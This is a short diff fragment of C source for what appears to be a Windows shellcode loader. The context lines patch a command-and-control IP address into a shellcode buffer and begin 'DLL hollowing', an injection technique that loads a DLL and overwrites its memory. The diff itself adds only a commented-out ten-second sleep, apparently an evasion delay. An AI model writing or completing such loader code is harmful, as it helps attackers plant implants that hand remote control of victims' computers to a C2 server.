@@ -47,6 +47,8 @@ int main(int args, char *argc[]) // TODO: Implement the actual check
     int position = 183;
     replaceIPInShellcode(buf, c2IP, position);
 
+    //Sleep(10000);
+
     // DLL Hollowing
 	DWORD saveProtect = 0;  // Variable to hold the old memory protection
 	HMODULE hTargetDLL = LoadLibrary( dllName ); // Load the DLL into memory and get a handle to it
